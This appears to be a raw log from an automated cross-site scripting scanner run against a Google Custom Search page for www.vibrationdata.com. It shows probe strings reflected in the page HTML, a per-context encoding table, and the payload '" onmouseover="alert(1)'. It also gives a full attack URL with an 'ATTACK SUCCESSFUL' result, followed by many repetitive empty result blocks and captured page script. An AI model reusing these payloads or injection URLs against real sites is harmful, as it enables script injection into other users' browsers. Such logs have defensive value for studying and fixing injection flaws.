+<a href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=FlWUXoruD_6a4-EP8-mImAk">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3D(uvw%2522xyz%27yxz%253C/zxy%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+<a class="q qs" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ_AUoAXoECAsQAw">
+<a class="q qs" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ_AUoAnoECAsQBA">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ_AUoAHoECAsQBg">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ_AUoAXoECAsQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ_AUoAnoECAsQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3D(uvw%2522xyz%2527yxz%253C/zxy%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQo_oBegQICxAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3D(uvw%2522xyz%2527yxz%253C/zxy%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQo_oBegQICxAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-safesearch-on="1" href="/setprefs?safeui=images&amp;sig=0_6xblYe8-_iZNO0Ntnz78rFHWcUc%3D&amp;prev=https://www.google.com/search?domains%3D(uvw%2522xyz%2527yxz%253C/zxy%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" id="safesearch" data-ved="2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQo_oBegQICxAM">
+<a href="/advanced_search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz'yxz%3C/zxy&amp;oe=ISO-8859-1&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQo_oBegQICxAN">
+<a href="/setprefs?safeui=images&amp;sig=0_6xblYe8-_iZNO0Ntnz78rFHWcUc%3D&amp;prev=https://www.google.com/search?domains%3D(uvw%2522xyz%2527yxz%253C/zxy%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAAegQIAhAF">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/fatigue.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzABegQIARAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/damping.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzACegQIBRAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/matlab_random_vibration.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzADegQIBBAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/StructuralDC.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAEegQIBhAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/SRS.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAFegQICRAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/Book_of_Mormon_Hebrew.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAGegQICBAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/transfer_functions.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAHegQIChAH">
+<a class="fl" href="/search?safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/rectangular_plates.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQHzAJegQIBxAH">
+<a aria-label="Page 2" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=10&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAp">
+<a aria-label="Page 3" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=20&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAr">
+<a aria-label="Page 4" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=30&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAt">
+<a aria-label="Page 5" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=40&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAv">
+<a aria-label="Page 6" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=50&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAx">
+<a aria-label="Page 7" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=60&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxAz">
+<a aria-label="Page 8" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=70&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxA1">
+<a aria-label="Page 9" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=80&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxA3">
+<a aria-label="Page 10" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=90&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8tMDegQICxA5">
+<a class="G0iuSb" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;ei=FlWUXoruD_6a4-EP8-mImAk&amp;start=10&amp;sa=N&amp;ved=2ahUKEwiK0cv6reXoAhV-zTgGHfM0ApMQ8NMDegQICxA7" id="pnnext" style="text-align:left">
+<meta content="0;url=/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=(uvw%22xyz%27yxz%3C/zxy&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=FlWUXoruD_6a4-EP8-mImAk" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: http://www.google.com/custom?domains=" onmouseover="alert(1)&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input name="domains" value='" onmouseover="alert(1)' type="hidden">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=(uvw"xyz'yxz</zxy&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='(uvw"xyz&#39;yxz&lt;/zxy site:www.vibrationdata.com' aria-label="Search" data-ved="0ahUKEwjbp-f-reXoAhXP4zgGHTBiAlAQ39UDCAk">
+<div jsdata="GXYZuf;;AKpBvs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iu2n2XYLhYLw">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>(uvw"xyz'yxz&lt;/zxy site:www.vibrationdata.com - Google Search</title>
+<em>(uvw&quot;xyz&#39;yxz&lt;/zxy site:www.vibrationdata.com</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="2IKMQ4NgragGIHCFqm5z9w==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22VGvP4GGzBs4V2ElMHcjmR0jYjMI\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iu2n2XYLhYLw","r-iu2n2XYLhYLw",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['AKpBvk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.vibrationdata.com\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22VGvP4GGzBs4V2ElMHcjmR0jYjMI\x22,\x22\x22,\x22H1WUXpucBs_H4-EPsMSJgAU\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','AKpBvo','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.vibrationdata.com\x22]\n,[\x22safe\x22,\x22active\x22]\n,[\x22client\x22,\x22pub-1751731975287442\x22]\n,[\x22domains\x22,\x22www.vibrationdata.com\x22]\n,[\x22ie\x22,\x22ISO-8859-1\x22]\n,[\x22oe\x22,\x22ISO-8859-1\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','AKpBvs','[0,\x22inline\x22,2,2500,0,0]\n','AKpBvw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586779423\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','AKpBv0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztuQNNe8NjIdqZBDv9HMw6DU2BaA9Q:1586779423309\x22,3]\n','AKpBv4','[1,null,null,1261,1349,0]\n'];
